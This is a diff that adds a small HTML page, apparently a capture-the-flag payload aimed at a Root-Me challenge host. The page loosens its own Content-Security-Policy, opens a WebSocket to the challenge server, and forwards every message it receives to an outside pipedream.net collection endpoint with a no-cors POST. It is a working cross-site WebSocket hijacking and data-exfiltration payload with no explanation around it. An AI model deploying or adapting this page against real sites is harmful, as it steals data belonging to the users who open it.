@@ -1,0 +1,15 @@
+<head>
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' ws: wss:">
+    <script>
+    var ws = new WebSocket('ws://ctf17.root-me.org/ws');
+    ws.onopen = function() {
+        ws.send("hello");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://eotoci65n24zl7e.m.pipedream.net/', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+    </script>
+</head>
+<body>
+    <h1>Test v2</h1>
+</body>
